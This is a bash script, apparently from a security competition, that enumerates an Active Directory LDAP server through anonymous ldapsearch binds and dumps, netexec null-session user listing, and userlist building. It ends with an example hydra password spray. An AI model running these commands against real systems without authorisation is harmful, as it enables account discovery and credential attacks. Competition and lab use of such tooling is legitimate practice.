#!/usr/bin/env bash
# ============================================================
# 02_ldap_thehouse.sh — target: thehouse.misty.view (.50)
# Windows Server 2022, Active Directory. Scored service: LDAP.
# ============================================================
# Usage:
#   TARGET_TEAM=07 ./02_ldap_thehouse.sh
#
# Requires (all open-source, all on Kali by default):
#   ldapsearch (ldap-utils), crackmapexec OR netexec, enum4linux-ng,
#   hydra (only for the credential-spray step, opt-in)
# ============================================================
set -euo pipefail
cd "$(dirname "$0")"
source ./scope.env

TARGET="$HOST_THEHOUSE"
assert_in_scope "$TARGET"
OUT="$OUTDIR/ldap_thehouse"
mkdir -p "$OUT"

echo "=== LDAP / AD enumeration: $TARGET ==="

# 1. Anonymous LDAP bind / basic naming context discovery
echo "[*] Attempting anonymous bind + naming contexts..."
ldapsearch -x -H "ldap://$TARGET" -s base namingcontexts | tee "$OUT/namingcontexts.txt" || true

# 2. If we know/guess a base DN (misty.view -> DC=misty,DC=view), try a full dump anonymously
BASE_DN="DC=misty,DC=view"
echo "[*] Attempting anonymous full enumeration against base DN: $BASE_DN"
ldapsearch -x -H "ldap://$TARGET" -b "$BASE_DN" "(objectClass=*)" \
    | tee "$OUT/anon_dump.txt" || true

# 3. netexec/crackmapexec: null session + RID brute to pull real usernames
if command -v netexec >/dev/null 2>&1; then
    CME=netexec
elif command -v crackmapexec >/dev/null 2>&1; then
    CME=crackmapexec
else
    CME=""
fi

if [[ -n "$CME" ]]; then
    echo "[*] Running $CME null-session user enumeration..."
    $CME ldap "$TARGET" -u '' -p '' --users | tee "$OUT/cme_users.txt" || true
else
    echo "[!] netexec/crackmapexec not found — skip null-session user enum or install it (apt install netexec)."
fi

# 4. Build a userlist from known domain accounts (packet pg. 10) + anything scraped above
printf "%s\n" "${USERS_THEHOUSE[@]}" > "$OUT/userlist.txt"
if [[ -f "$OUT/cme_users.txt" ]]; then
    grep -oP '(?<=\\)[\w.\-]+(?=\s)' "$OUT/cme_users.txt" 2>/dev/null >> "$OUT/userlist.txt" || true
fi
sort -u -o "$OUT/userlist.txt" "$OUT/userlist.txt"
echo "[*] Userlist written to $OUT/userlist.txt"

cat <<'EOF'

[*] Opt-in credential spray (default creds / weak-password check):
    Only run this against a userlist you trust and a small, sane
    wordlist — this is a scored, shared-network competition, don't
    hammer it. Default/released credentials come from the comp
    organizers on the day of the event (see "Default Credentials"
    in the packet) — try those first before brute-forcing.

Example (edit passwords list first):
    hydra -L OUT/userlist.txt -P ./wordlists/comp_default_creds.txt \
          ldap://TARGET -t 4 -w 30

EOF

echo "=== Done. Review $OUT/ for anonymous dump contents, RID-cycled users, etc. ==="
